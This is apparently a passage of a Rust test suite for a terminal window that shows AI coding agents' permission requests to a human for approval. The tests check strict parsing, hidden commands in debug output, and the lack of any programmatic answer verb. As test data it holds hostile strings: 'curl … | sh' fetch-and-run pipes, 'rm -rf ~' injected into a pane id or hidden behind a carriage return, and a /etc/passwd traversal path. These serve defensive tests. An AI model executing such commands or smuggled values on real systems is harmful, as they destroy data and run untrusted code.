        arguments(&["--pane", "7", "--follow"]),
        Ok(protocol::Follow { pane: Some(7) })
    );
    for (words, said) in [
        (&[][..], "needs --follow"),
        (&["--pane", "7"][..], "needs --follow"),
        (&["--follow", "--follow"][..], "given twice"),
        (&["--follow", "--pane"][..], "`--pane` needs a value"),
        (&["--follow", "--pane", "all"][..], "not all"),
        (&["--follow", "7"][..], "unrecognised argument 7"),
    ] {
        let refusal = arguments(words).expect_err("refused");
        assert!(refusal.contains(said), "{words:?}: {refusal}");
    }
}

#[test]
fn a_feed_holds_at_most_its_buffer_and_tells_a_slow_reader_how_many_it_dropped() {
    let feed = watch::Feed::new(watch::FOLLOW_BUFFER);
    let pushed = watch::FOLLOW_BUFFER * 10;
    for number in 0..pushed {
        feed.push(json!(number));
        assert!(
            feed.held() <= watch::FOLLOW_BUFFER,
            "a reader that takes nothing makes the window hold no more than the buffer"
        );
    }

    // The gap first, where it is, then what was kept, newest last and in
    // the order it was pushed.
    let dropped = pushed - watch::FOLLOW_BUFFER;
    assert_eq!(feed.next(None), watch::Next::Lagged(dropped as u64));
    for number in dropped..pushed {
        assert_eq!(feed.next(None), watch::Next::Item(json!(number)));
    }
    assert_eq!(
        feed.next(Some(Instant::now() + Duration::from_millis(20))),
        watch::Next::TimedOut
    );

    // Ended: what is held is still taken, and then it says so.
    feed.push(json!("last"));
    feed.end();
    feed.push(json!("after the end"));
    assert_eq!(feed.next(None), watch::Next::Item(json!("last")));
    assert_eq!(feed.next(None), watch::Next::Ended);
    assert!(!feed.is_open());

    // Hung up: what it held is let go of at once.
    let feed = watch::Feed::new(4);
    feed.push(json!(1));
    feed.hang_up();
    assert_eq!(feed.held(), 0);
    assert_eq!(feed.next(None), watch::Next::HungUp);
}

/// What a Claude Code hook in a pane on pts/3 asks before `rm -rf build`.
fn agent_ask(command: &str) -> protocol::AgentAsk {
    protocol::AgentAsk {
        agent: protocol::AskingAgent::Claude,
        session: "4f1c2b7e-0d3a".to_owned(),
        cwd: "/home/someone/work/crook".to_owned(),
        tty: Some(34819),
        multiplexer: None,
        wait: 300,
        request: AskRequest::Command {
            command: command.to_owned(),
            note: Some("Remove the build directory".to_owned()),
            timeout_ms: Some(120_000),
            background: false,
            outside_sandbox: true,
        },
    }
}

/// `agent_ask`'s `args` as the wire carries them, to be spoiled.
fn agent_ask_args() -> Value {
    serde_json::to_value(agent_ask("rm -rf build")).expect("encodes")
}

/// The verb a request line with `args` asks as `agent.ask`, or the code of
/// its refusal.
fn asked_with(args: &Value) -> Result<Verb, String> {
    verdict(&json!({"v": 1, "verb": "agent.ask", "token": "c0ffee", "args": args}).to_string()).1
}

#[test]
fn a_question_from_a_hook_comes_back_off_the_wire_as_it_went_on() {
    let asked = agent_ask("rm -rf build\necho done");
    let line = protocol::request_line(&Verb::AgentAsk(asked.clone()), Some("c0ffee"));
    assert!(line.ends_with('\n') && line.matches('\n').count() == 1);
    let (_, request) = protocol::read(line.trim_end().as_bytes());
    assert_eq!(
        request,
        Ok(Request {
            verb: Verb::AgentAsk(asked.clone()),
            token: Some("c0ffee".to_owned()),
            asker: None,
        })
    );
    let Verb::AgentAsk(read) = request.expect("read").verb else {
        panic!("not a question");
    };
    assert_eq!(read.digest(), asked.digest(), "and names itself the same");
    assert!(Verb::AgentAsk(asked).keeps_connection());

    // The answer and the hook's word back, each a line.
    let answered = protocol::Answered::pass("expired");
    assert_eq!(
        answered.line(),
        "{\"answer\":{\"decision\":\"pass\",\"why\":\"expired\"}}\n"
    );
    let read: protocol::Answered =
        serde_json::from_str(&answered.line()).expect("an answer reads back");
    assert_eq!(read, answered);
    let delivered: protocol::Delivered =
        serde_json::from_str("{\"delivered\":true}").expect("the hook's word reads");
    assert!(delivered.delivered);
}

#[test]
fn an_ask_with_a_field_or_kind_this_window_does_not_know_is_refused() {
    assert!(matches!(
        asked_with(&agent_ask_args()),
        Ok(Verb::AgentAsk(_))
    ));
    let refused = Err(code::BAD_REQUEST.to_owned());

    let mut args = agent_ask_args();
    args["sandbox"] = json!("none");
    assert_eq!(asked_with(&args), refused, "a field of the question's");
    let mut args = agent_ask_args();
    args["request"]["env"] = json!({"PATH": "/tmp"});
    assert_eq!(asked_with(&args), refused, "a field of the request's");
    let mut args = agent_ask_args();
    args["request"]["kind"] = json!("notebook-edit");
    assert_eq!(asked_with(&args), refused, "a kind");
    let mut args = agent_ask_args();
    args["request"]["kind"] = json!("edit");
    assert_eq!(asked_with(&args), refused, "a kind with another's fields");
    let mut args = agent_ask_args();
    args["agent"] = json!("codex");
    assert_eq!(asked_with(&args), refused, "an agent");
    // A flag left out is not taken as off.
    let mut args = agent_ask_args();
    args["request"]
        .as_object_mut()
        .expect("an object")
        .remove("outside_sandbox");
    assert_eq!(asked_with(&args), refused, "a flag left out");

    // Nor one the window could not show whole, or not bind.
    for (field, wrong) in [
        ("session", json!("two words")),
        ("cwd", json!("work/crook")),
        ("cwd", json!(format!("/{}", "d".repeat(protocol::MAX_CWD)))),
        ("wait", json!(0)),
        ("wait", json!(protocol::MAX_ASK_WAIT_SECS + 1)),
        ("tty", json!(-1)),
    ] {
        let mut args = agent_ask_args();
        args[field] = wrong.clone();
        assert_eq!(asked_with(&args), refused, "{field}: {wrong}");
    }
    let mut args = agent_ask_args();
    args["request"]["command"] = json!("");
    assert_eq!(asked_with(&args), refused, "an empty command");
    let mut args = agent_ask_args();
    args["request"]["command"] = json!("x".repeat(crate::agent::request::MAX_COMMAND + 1));
    assert_eq!(asked_with(&args), refused, "a command too long");
    assert_eq!(
        verdict(r#"{"v":1,"verb":"agent.ask"}"#).1,
        refused,
        "no args at all"
    );
}

/// `agent_ask`, from inside tmux: its clients' terminals in place of its own.
fn agent_ask_in_tmux(command: &str) -> protocol::AgentAsk {
    protocol::AgentAsk {
        tty: None,
        multiplexer: Some(protocol::Multiplexer {
            kind: protocol::MultiplexerKind::Tmux,
            clients: vec![34819, 34823],
            pane: "%3".to_owned(),
        }),
        ..agent_ask(command)
    }
}

#[test]
fn a_question_from_inside_tmux_names_the_clients_and_one_from_a_pane_is_what_it_was() {
    let asked = agent_ask_in_tmux("rm -rf build");
    let line = protocol::request_line(&Verb::AgentAsk(asked.clone()), None);
    let (_, request) = protocol::read(line.trim_end().as_bytes());
    assert_eq!(
        request.map(|request| request.verb),
        Ok(Verb::AgentAsk(asked))
    );
    let sent: Value = serde_json::from_str(&line).expect("JSON");
    assert_eq!(sent["args"].get("tty"), None);
    assert_eq!(
        sent["args"]["multiplexer"],
        json!({"kind": "tmux", "clients": [34819, 34823], "pane": "%3"})
    );

    // A question from a pane carries what it always did, and no more: the
    // line an older window reads.
    let args = agent_ask_args();
    let mut keys: Vec<_> = args.as_object().expect("an object").keys().collect();
    keys.sort();
    assert_eq!(keys, ["agent", "cwd", "request", "session", "tty", "wait"]);
}

#[test]
fn a_question_names_one_terminal_or_a_multiplexers_clients_and_never_both_or_neither() {
    let refused = Err(code::BAD_REQUEST.to_owned());
    let tmux = || serde_json::to_value(agent_ask_in_tmux("ls")).expect("encodes");
    assert!(matches!(asked_with(&tmux()), Ok(Verb::AgentAsk(_))));

    let mut both = tmux();
    both["tty"] = json!(34819);
    assert_eq!(asked_with(&both), refused, "both");
    let mut neither = agent_ask_args();
    neither.as_object_mut().expect("an object").remove("tty");
    assert_eq!(asked_with(&neither), refused, "neither");
    for (field, wrong) in [
        ("clients", json!([])),
        (
            "clients",
            json!((0..=protocol::MAX_CLIENTS as u32).collect::<Vec<_>>()),
        ),
        ("clients", json!([-1])),
        ("pane", json!("3")),
        ("pane", json!("%")),
        ("pane", json!("%3; rm -rf ~")),
        ("pane", json!("%\u{202e}3")),
        (
            "pane",
            json!(format!("%{}", "1".repeat(protocol::MAX_PANE_ID))),
        ),
        ("kind", json!("screen")),
        ("socket", json!("/tmp/tmux-1000/default")),
    ] {
        let mut args = tmux();
        args["multiplexer"][field] = wrong.clone();
        assert_eq!(asked_with(&args), refused, "{field}: {wrong}");
    }
}

#[test]
fn pane_find_carries_terminals_and_nothing_else() {
    let find =
        |args: Value| verdict(&json!({"v": 1, "verb": "pane.find", "args": args}).to_string()).1;
    let asked = protocol::Find {
        ttys: vec![34819, 34823],
    };
    assert_eq!(
        find(json!({"ttys": [34819, 34823]})),
        Ok(Verb::PaneFind(asked.clone()))
    );
    assert_eq!(
        protocol::request_line(&Verb::PaneFind(asked.clone()), None),
        "{\"args\":{\"ttys\":[34819,34823]},\"v\":1,\"verb\":\"pane.find\"}\n"
    );
    assert!(!Verb::PaneFind(asked).keeps_connection());
    let refused = Err(code::BAD_REQUEST.to_owned());
    for wrong in [
        json!({"ttys": []}),
        json!({"ttys": (0..=protocol::MAX_CLIENTS as u32).collect::<Vec<_>>()}),
        json!({"ttys": [1], "request": {"kind": "command", "command": "ls"}}),
        json!({"ttys": [1], "session": "s1"}),
        json!({}),
    ] {
        assert_eq!(find(wrong.clone()), refused, "{wrong}");
    }
    assert_eq!(
        verdict(r#"{"v":1,"verb":"pane.find"}"#).1,
        refused,
        "no args at all"
    );
}

/// `agent_ask`, about an edit to `path` instead.
fn agent_ask_edit(path: &str) -> protocol::AgentAsk {
    protocol::AgentAsk {
        request: AskRequest::Edit {
            path: path.to_owned(),
            edits: vec![crate::agent::request::FileEdit {
                old: "alpha".to_owned(),
                new: "beta".to_owned(),
                replace_all: false,
            }],
            resolves_outside: false,
        },
        ..agent_ask("ls")
    }
}

#[test]
fn an_edit_or_a_write_comes_off_the_wire_whole_or_is_refused() {
    let asked = agent_ask_edit("/home/someone/work/crook/notes.txt");
    let line = protocol::request_line(&Verb::AgentAsk(asked.clone()), None);
    let (_, request) = protocol::read(line.trim_end().as_bytes());
    assert_eq!(
        request.map(|request| request.verb),
        Ok(Verb::AgentAsk(asked))
    );
    let write = protocol::AgentAsk {
        request: AskRequest::Write {
            path: "/home/someone/work/crook/notes.txt".to_owned(),
            content: "alpha\n".to_owned(),
            resolves_outside: false,
            replaces: None,
        },
        ..agent_ask("ls")
    };
    let line = protocol::request_line(&Verb::AgentAsk(write.clone()), None);
    let (_, request) = protocol::read(line.trim_end().as_bytes());
    assert_eq!(
        request.map(|request| request.verb),
        Ok(Verb::AgentAsk(write))
    );

    let refused = Err(code::BAD_REQUEST.to_owned());
    let args = || serde_json::to_value(agent_ask_edit("/w/notes.txt")).expect("encodes");
    assert!(matches!(asked_with(&args()), Ok(Verb::AgentAsk(_))));
    for (case, spoil) in [
        ("a field of the request's", json!({"mode": "0755"})),
        ("a relative path", json!({"path": "notes.txt"})),
        ("a newline in the path", json!({"path": "/w/a\nb"})),
        ("no edits", json!({"edits": []})),
        (
            "a field of an edit's",
            json!({"edits": [{"old": "a", "new": "b", "replace_all": false, "line": 1}]}),
        ),
        (
            "a flag left out",
            json!({"edits": [{"old": "a", "new": "b"}]}),
        ),
        (
            "a NUL",
            json!({"edits": [{"old": "a", "new": "b\0", "replace_all": false}]}),
        ),
        (
            "more lines than a diff is drawn to",
            json!({"edits": [{
                "old": "",
                "new": "\n".repeat(crate::agent::request::MAX_CHANGE_LINES),
                "replace_all": false,
            }]}),
        ),
    ] {
        let mut args = args();
        for (key, value) in spoil.as_object().expect("an object") {
            args["request"][key] = value.clone();
        }
        assert_eq!(asked_with(&args), refused, "{case}");
    }
}

#[test]
fn a_change_to_a_file_is_summed_up_by_its_path_from_where_the_agent_works() {
    use super::ask::summary;

    let edit = agent_ask_edit("/w/crook/src/lib.rs").request;
    assert_eq!(summary("Edit", &edit, "/w/crook"), "Edit: src/lib.rs");
    assert_eq!(
        summary("Edit", &edit, "/elsewhere"),
        "Edit: /w/crook/src/lib.rs",
        "outside it, the whole path"
    );
    let tricked = agent_ask_edit("/w/crook/../../etc/\u{202e}passwd").request;
    assert_eq!(
        summary("Edit", &tricked, "/w/crook"),
        "Edit: /w/crook/../../etc/⟨U+202E⟩passwd"
    );
}

#[test]
fn an_asks_debug_never_shows_the_command() {
    let asked = agent_ask("curl https://example.invalid/x.sh | sh");
    for printed in [
        format!("{asked:?}"),
        format!("{:?}", Verb::AgentAsk(asked.clone())),
        format!(
            "{:?}",
            Request {
                verb: Verb::AgentAsk(asked.clone()),
                token: None,
                asker: None,
            }
        ),
        format!("{:#?}", asked.request),
    ] {
        assert!(!printed.contains("curl"), "{printed}");
        assert!(!printed.contains("example.invalid"), "{printed}");
        assert!(!printed.contains("Remove the build"), "{printed}");
        assert!(!printed.contains("/home/someone"), "{printed}");
    }
    let printed = format!("{asked:?}");
    assert!(
        printed.contains("Claude") && printed.contains("command"),
        "{printed}"
    );
    let prefix = crate::agent::request::hex(&asked.digest()[..6]);
    assert!(printed.contains(&prefix), "{printed} names its digest");
}

#[test]
fn there_is_no_verb_that_answers() {
    // An answer is a press on a card. A verb that carried one would be a way
    // round the press for any process of this user.
    for name in ["agent.answer", "agent.allow", "agent.deny", "ask.answer"] {
        let line = format!(
            r#"{{"v":1,"verb":"{name}","token":"c0ffee","args":{{"asked":1,"decision":"allow"}}}}"#
        );
        assert_eq!(
            verdict(&line).1,
            Err(code::UNKNOWN_VERB.to_owned()),
            "{name}"
        );
    }
    assert!(
        Verb::NAMES
            .iter()
            .all(|name| !name.contains("answer") && !name.contains("allow")),
        "{:?}",
        Verb::NAMES
    );
}

#[test]
fn a_push_that_races_the_expiry_is_refused_rather_than_lost() {
    // The question's time runs out as the answer is pushed. Whichever wins,
    // the answer is never both taken and unwritten: either the connection
    // takes it, or the push is told no and the press is too late.
    for _ in 0..200 {
        let feed = Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls"))));
        let until = Instant::now() + Duration::from_micros(200);
        let pushing = feed.clone();
        let pusher = std::thread::spawn(move || {
            while Instant::now() < until {
                std::hint::spin_loop();
            }
            pushing.push(json!({"answer": {"decision": "allow"}}))
        });
        let taken = feed.next_or_close(until);
        let pushed = pusher.join().expect("the pusher");
        match taken {
            watch::Next::Item(_) => assert!(pushed, "taken, so it was pushed"),
            watch::Next::TimedOut => {
                assert!(
                    !pushed,
                    "the time ran out, and the push was told it was too late"
                );
                assert!(!feed.is_open());
            }
            other => panic!("{other:?}"),
        }
    }
    // Once it has run out, a push is refused, whenever it comes.
    let feed = watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls")));
    assert_eq!(
        feed.next_or_close(Instant::now() + Duration::from_millis(5)),
        watch::Next::TimedOut
    );
    assert!(!feed.push(json!({"answer": {"decision": "allow"}})));
    assert_eq!(feed.held(), 0);
}

#[test]
fn an_ask_feed_never_drops_an_answer() {
    let feed = watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls")));
    let allow = json!({"answer": {"decision": "allow"}});
    assert!(feed.push(allow.clone()));
    // A second answer — a pass for the turn ending, a second press — is
    // refused, and the first is what the hook gets.
    assert!(!feed.push(json!({"answer": {"decision": "pass"}})));
    assert_eq!(feed.held(), 1);
    assert_eq!(
        feed.next_or_close(Instant::now() + Duration::from_secs(1)),
        watch::Next::Item(allow)
    );
    // Ended or hung up, nothing more is taken, and it says so.
    feed.end();
    assert!(!feed.push(json!(1)));
    let feed = watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls")));
    assert!(feed.hang_up(), "it was open");
    assert!(!feed.hang_up(), "and is not twice");
    assert!(!feed.push(json!(1)));

    // A stream's feed still drops its oldest for a reader that lags.
    let stream = watch::Feed::for_verb(&Verb::EventsFollow(protocol::Follow::default()));
    for number in 0..=watch::FOLLOW_BUFFER {
        assert!(stream.push(json!(number)));
    }
    assert_eq!(stream.held(), watch::FOLLOW_BUFFER);
}

#[test]
fn a_press_reaches_only_the_question_it_was_given_about() {
    use super::ask::{Asks, CannotAnswer, Choice, DENIED, Delivery, Found, How};

    let pane = crate::tab::PaneId::next();
    let found = |cannot_answer| Found {
        pane,
        cannot_answer,
        tab_title: "crook".to_owned(),
        inside: None,
    };
    let feed = || Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls"))));
    let from = |session: &str, command: &str| protocol::AgentAsk {
        session: session.to_owned(),
        ..agent_ask(command)
    };
    let mut asks = Asks::default();

    let asked = from("s1", "rm -rf build");
    let digest = asked.digest();
    let fed = feed();
    let id = asks
        .add(asked, found(None), fed.clone(), Instant::now())
        .expect("held");
    // A press about something else is stale, and sends nothing.
    assert_eq!(
        asks.deliver(id, &from("s1", "rm -rf dist").digest(), Choice::Allow),
        Delivery::Stale
    );
    assert_eq!(fed.held(), 0);
    // The question's own goes, once.
    assert_eq!(asks.deliver(id, &digest, Choice::Deny), Delivery::Delivered);
    assert_eq!(
        fed.next_or_close(Instant::now() + Duration::from_secs(1)),
        watch::Next::Item(json!({"answer": {"decision": "deny", "message": DENIED}}))
    );
    assert_eq!(asks.deliver(id, &digest, Choice::Allow), Delivery::TooLate);
    assert!(asks.is_empty());
    let outcome = asks.history().last().expect("remembered").clone();
    assert_eq!(outcome.how, How::Answered(Choice::Deny));
    assert!(!outcome.delivered, "not until the hook says so");
    asks.heard(Notice::Delivered(id));
    assert!(asks.history().last().expect("remembered").delivered);

    // One this window cannot answer is never answered.
    let asked = from("s2", "rm -rf build");
    let digest = asked.digest();
    let fed = feed();
    let id = asks
        .add(
            asked,
            found(Some(CannotAnswer::NotFromThisTab)),
            fed.clone(),
            Instant::now(),
        )
        .expect("held");
    assert_eq!(asks.deliver(id, &digest, Choice::Allow), Delivery::ReadOnly);
    assert_eq!(fed.held(), 0);
    asks.end(id, super::ask::Cause::TurnEnded);

    // One whose time ran out under the press is too late, and waits for the
    // connection's word to end it.
    let asked = from("s3", "rm -rf build");
    let digest = asked.digest();
    let fed = feed();
    let id = asks
        .add(asked, found(None), fed.clone(), Instant::now())
        .expect("held");
    assert_eq!(fed.next_or_close(Instant::now()), watch::Next::TimedOut);
    assert_eq!(asks.deliver(id, &digest, Choice::Allow), Delivery::TooLate);
    assert_eq!(
        asks.len(),
        0,
        "a question nobody waits on is shown no longer"
    );
    asks.heard(Notice::Expired(id));
    assert!(asks.is_empty());
    assert_eq!(
        asks.history().last().map(|outcome| outcome.how),
        Some(How::Ended(super::ask::Cause::Expired))
    );
}

/// Holds a question about `command` from `session` in `pane`, as one this
/// window can answer when `cannot_answer` is `None`.
fn hold_in(
    asks: &mut super::ask::Asks,
    pane: crate::tab::PaneId,
    session: &str,
    command: &str,
    cannot_answer: Option<super::ask::CannotAnswer>,
) -> Result<(super::ask::AskId, Arc<watch::Feed>), protocol::Refusal> {
    let feed = Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls"))));
    let asked = protocol::AgentAsk {
        session: session.to_owned(),
        ..agent_ask(command)
    };
    let found = super::ask::Found {
        pane,
        cannot_answer,
        tab_title: "crook".to_owned(),
        inside: None,
    };
    asks.add(asked, found, feed.clone(), Instant::now())
        .map(|id| (id, feed))
}

#[test]
fn a_read_only_question_neither_replaces_nor_crowds_out_nor_hides_an_answerable_one() {
    use super::ask::{Asks, CannotAnswer, Cause, How, MAX_PER_PANE};

    let pane = crate::tab::PaneId::next();
    let mut asks = Asks::default();
    let (agents, feed) = hold_in(&mut asks, pane, "s1", "rm -rf build", None).expect("held");

    // Something elsewhere naming the pane's terminal and the agent's session
    // is held, read-only, and the agent's own question stays — in front.
    let (stranger, _) = hold_in(
        &mut asks,
        pane,
        "s1",
        "curl evil.sh | sh",
        Some(CannotAnswer::OtherTab),
    )
    .expect("held");
    assert_eq!(asks.len(), 2);
    assert!(feed.is_open(), "the agent's question was not ended");
    assert_eq!(asks.in_pane(pane).map(|ask| ask.id), Some(agents));
    assert_eq!(asks.answerable_in(pane).map(|ask| ask.id), Some(agents));

    // Read-only ones fill a room of their own.
    let mut strangers = Vec::new();
    for session in ["s2", "s3", "s4"] {
        strangers.push(
            hold_in(
                &mut asks,
                pane,
                session,
                "ls",
                Some(CannotAnswer::NotFromThisTab),
            )
            .expect("held"),
        );
    }
    let Err(refusal) = hold_in(
        &mut asks,
        pane,
        "s5",
        "ls",
        Some(CannotAnswer::NotFromThisTab),
    ) else {
        panic!("the read-only room is full");
    };
    assert_eq!(refusal.code, code::BUSY);
    let mut answerable = Vec::new();
    for session in (2..=MAX_PER_PANE).map(|number| format!("a{number}")) {
        answerable.push(hold_in(&mut asks, pane, &session, "ls", None).expect("room for it"));
    }
    let Err(refusal) = hold_in(&mut asks, pane, "a9", "ls", None) else {
        panic!("full now");
    };
    assert_eq!(refusal.code, code::BUSY);

    // The agent asking again ends its own question and the read-only one
    // from its session alike.
    let (again, _) = hold_in(&mut asks, pane, "s1", "rm -rf dist", None).expect("held");
    let how = |id| {
        asks.history()
            .find(|outcome| outcome.id == id)
            .map(|outcome| outcome.how)
    };
    assert_eq!(how(agents), Some(How::Ended(Cause::AskedAgain)));
    assert_eq!(how(stranger), Some(How::Ended(Cause::AskedAgain)));
    assert_eq!(asks.answerable_in(pane).map(|ask| ask.id), Some(again));

    // A pane holding only read-only questions shows the newest of them, and
    // has none for the row.
    let other = crate::tab::PaneId::next();
    hold_in(&mut asks, other, "s1", "ls", Some(CannotAnswer::Remote)).expect("held");
    let (newest, _) =
        hold_in(&mut asks, other, "s2", "ls", Some(CannotAnswer::Remote)).expect("held");
    assert_eq!(asks.in_pane(other).map(|ask| ask.id), Some(newest));
    assert!(asks.answerable_in(other).is_none());
}

/// [`hold_in`], answerable, from inside tmux.
fn hold_from_tmux(
    asks: &mut super::ask::Asks,
    pane: crate::tab::PaneId,
    session: &str,
) -> Result<(super::ask::AskId, Arc<watch::Feed>), protocol::Refusal> {
    let feed = Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls"))));
    let asked = protocol::AgentAsk {
        session: session.to_owned(),
        ..agent_ask_in_tmux("ls")
    };
    let found = super::ask::Found {
        pane,
        cannot_answer: None,
        tab_title: "crook".to_owned(),
        inside: Some(super::ask::Inside {
            kind: protocol::MultiplexerKind::Tmux,
            pane: "%3".to_owned(),
            elsewhere: 0,
        }),
    };
    asks.add(asked, found, feed.clone(), Instant::now())
        .map(|id| (id, feed))
}

#[test]
fn a_question_from_inside_tmux_neither_replaces_nor_crowds_out_nor_hides_the_panes_own() {
    use super::ask::{Asks, MAX_PER_PANE};

    let pane = crate::tab::PaneId::next();
    let mut asks = Asks::default();
    let (agents, feed) = hold_in(&mut asks, pane, "s1", "rm -rf build", None).expect("held");

    // Newer, answerable and from the same session: held beside it, and
    // behind it.
    let (through_tmux, _) = hold_from_tmux(&mut asks, pane, "s1").expect("held");
    assert!(feed.is_open(), "the pane's own question was ended");
    assert_eq!(asks.answerable_in(pane).map(|ask| ask.id), Some(agents));
    assert_eq!(asks.in_pane(pane).map(|ask| ask.id), Some(agents));

    // They fill a room of their own.
    for session in ["t2", "t3", "t4"] {
        hold_from_tmux(&mut asks, pane, session).expect("held");
    }
    let Err(refusal) = hold_from_tmux(&mut asks, pane, "t5") else {
        panic!("the room from inside tmux is full");
    };
    assert_eq!(refusal.code, code::BUSY);
    for session in (2..=MAX_PER_PANE).map(|number| format!("a{number}")) {
        hold_in(&mut asks, pane, &session, "ls", None).expect("room for the pane's own");
    }

    // Once the pane's own have gone, one from inside tmux is the one shown.
    let mut asks = Asks::default();
    hold_from_tmux(&mut asks, pane, "t1").expect("held");
    let (newest, _) = hold_from_tmux(&mut asks, pane, "t2").expect("held");
    assert_eq!(asks.answerable_in(pane).map(|ask| ask.id), Some(newest));
    let _ = through_tmux;
}

#[test]
fn a_question_from_inside_tmux_is_answerable_only_under_the_tmux_holding_the_pane() {
    use super::ask::from_its_tmux;
    use protocol::{Asker, Executable, Holder};

    const PANE: u32 = 34819;
    let tmux = Executable {
        device: 2049,
        inode: 1_234_567,
    };
    let perl = Executable {
        device: 2049,
        inode: 7_654_321,
    };
    let asker = |holders: Vec<Holder>| Asker {
        pid: Some(400),
        lineage: vec![400, 300, 200, 100],
        holders,
    };
    let holder = |pid, executable, terminals: Vec<u32>| Holder {
        pid,
        executable: Some(executable),
        terminals,
    };

    // tmux's server: an ancestor running the pane's tmux, holding its client.
    let under_tmux = asker(vec![
        holder(300, perl, vec![]),
        holder(100, tmux, vec![PANE, 7]),
    ]);
    assert!(from_its_tmux(&under_tmux, Some(PANE), Some(tmux)));

    // An ancestor that opened the pane's terminal and runs something else.
    let opened = asker(vec![holder(300, perl, vec![PANE])]);
    assert!(!from_its_tmux(&opened, Some(PANE), Some(tmux)));
    // tmux holding another terminal than the pane's.
    let elsewhere = asker(vec![holder(100, tmux, vec![7])]);
    assert!(!from_its_tmux(&elsewhere, Some(PANE), Some(tmux)));
    // A pane whose foreground is not that tmux.
    assert!(!from_its_tmux(&under_tmux, Some(PANE), Some(perl)));
    // Nothing read: nothing is answerable.
    assert!(!from_its_tmux(&asker(Vec::new()), Some(PANE), Some(tmux)));
    assert!(!from_its_tmux(&under_tmux, None, Some(tmux)));
    assert!(!from_its_tmux(&under_tmux, Some(PANE), None));
    let unread = asker(vec![Holder {
        pid: 100,
        executable: None,
        terminals: vec![PANE],
    }]);
    assert!(!from_its_tmux(&unread, Some(PANE), Some(tmux)));
}

#[test]
fn a_question_whose_connection_gave_up_is_neither_held_nor_shown_nor_kept() {
    use super::ask::{Asks, Cause, How};

    let pane = crate::tab::PaneId::next();
    let mut asks = Asks::default();

    // Asked of a window too slow to say it held it before the connection
    // stopped waiting: the hook has passed, and nothing is held.
    let feed = Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls"))));
    feed.hang_up();
    let refused = asks
        .add(
            agent_ask("ls"),
            super::ask::Found {
                pane,
                cannot_answer: None,
                tab_title: "crook".to_owned(),
                inside: None,
            },
            feed,
            Instant::now(),
        )
        .expect_err("not held");
    assert_eq!(refused.code, code::GONE);
    assert!(asks.is_empty());
    assert_eq!(asks.history().count(), 0);

    // Held, and given up on a moment later with no word to the window: not
    // shown from then on, and dropped as its hook gone the next time a
    // question is held.
    let (id, feed) = hold_in(&mut asks, pane, "s1", "ls", None).expect("held");
    feed.hang_up();
    assert!(asks.is_empty());
    assert_eq!(asks.len(), 0);
    assert!(asks.in_pane(pane).is_none());
    assert!(asks.live().next().is_none());
    hold_in(&mut asks, pane, "s2", "ls", None).expect("held");
    assert_eq!(
        asks.history()
            .find(|outcome| outcome.id == id)
            .map(|outcome| outcome.how),
        Some(How::Ended(Cause::HookGone))
    );
    assert_eq!(asks.len(), 1);
}

#[test]
fn a_question_is_summed_up_by_its_first_line_written_out_and_cut() {
    use super::ask::{SUMMARY_CHARS, summary};

    let command = |command: &str| AskRequest::Command {
        command: command.to_owned(),
        note: None,
        timeout_ms: None,
        background: false,
        outside_sandbox: false,
    };
    assert_eq!(
        summary("Bash", &command("rm -rf build"), "/w"),
        "Bash: rm -rf build"
    );
    // A carriage return is shown, not obeyed; and lines after the first
    // are said to be there.
    assert_eq!(
        summary("Bash", &command("\n  \necho safe\rrm -rf ~\nmake"), "/w"),
        "Bash: echo safe␍rm -rf ~ …"
    );
    let long = summary("Bash", &command(&"x".repeat(500)), "/w");
    assert_eq!(long.chars().count(), SUMMARY_CHARS);
    assert!(long.ends_with('…'));
}

#[test]
fn the_window_remembers_the_last_sixty_four_questions_and_no_more() {
    use super::ask::{Asks, Cause, Found, HISTORY, How};

    let pane = crate::tab::PaneId::next();
    let mut asks = Asks::default();
    for number in 0..HISTORY + 10 {
        let asked = protocol::AgentAsk {
            session: format!("s{number}"),
            ..agent_ask("ls")
        };
        let id = asks
            .add(
                asked,
                Found {
                    pane,
                    cannot_answer: None,
                    tab_title: "crook".to_owned(),
                    inside: None,
                },
                Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls")))),
                Instant::now(),
            )
            .expect("held");
        asks.end(id, Cause::TurnEnded);
        // Ending it twice is ending it once.
        asks.end(id, Cause::PaneClosed);
    }
    let history: Vec<_> = asks.history().collect();
    assert_eq!(history.len(), HISTORY);
    assert!(
        history
            .iter()
            .all(|outcome| outcome.how == How::Ended(Cause::TurnEnded))
    );
    assert_eq!(history[0].id.as_u64(), 11, "the oldest went first");
    assert_eq!(history[0].tool, "Bash");
    assert_eq!(history[0].summary, "Bash: ls");
}

/// The trail a pane's "Why this status" and the inbox read is the window's
/// last sixty-four outcomes, and what is kept for the leads following the
/// panes is bounded as well, for a window that never takes it.
#[test]
fn the_trail_keeps_sixty_four() {
    use super::ask::{Asks, Cause, Found, HISTORY, How};

    let pane = crate::tab::PaneId::next();
    let mut asks = Asks::default();
    for number in 0..HISTORY * 3 {
        let asked = protocol::AgentAsk {
            session: format!("s{number}"),
            ..agent_ask(&format!("echo {number}"))
        };
        let id = asks
            .add(
                asked,
                Found {
                    pane,
                    cannot_answer: None,
                    tab_title: "crook".to_owned(),
                    inside: None,
                },
                Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls")))),
                Instant::now(),
            )
            .expect("held");
        asks.end(id, Cause::Expired);
        assert!(asks.untold() <= HISTORY, "{}", asks.untold());
    }
    let history: Vec<_> = asks.history().collect();
    assert_eq!(history.len(), HISTORY);
    assert_eq!(
        history.last().map(|outcome| outcome.summary.as_str()),
        Some(format!("Bash: echo {}", HISTORY * 3 - 1).as_str()),
        "the newest is kept"
    );
    assert!(
        history
            .iter()
            .all(|outcome| outcome.how == How::Ended(Cause::Expired))
    );
    let told = asks.take_told();
    assert_eq!(told.len(), HISTORY);
    assert_eq!(asks.untold(), 0, "taken once");
}

#[test]
fn a_block_that_printed_more_than_an_answer_carries_is_cut_from_the_front_at_a_line() {
    let short = "one\ntwo";
    assert_eq!(blocks::tail(short, 64), (short, false));

    let long: String = (0..1000).map(|line| format!("line {line}\n")).collect();
    let (kept, cut) = blocks::tail(&long, 100);
    assert!(cut);
    assert!(kept.len() <= 100, "{}", kept.len());
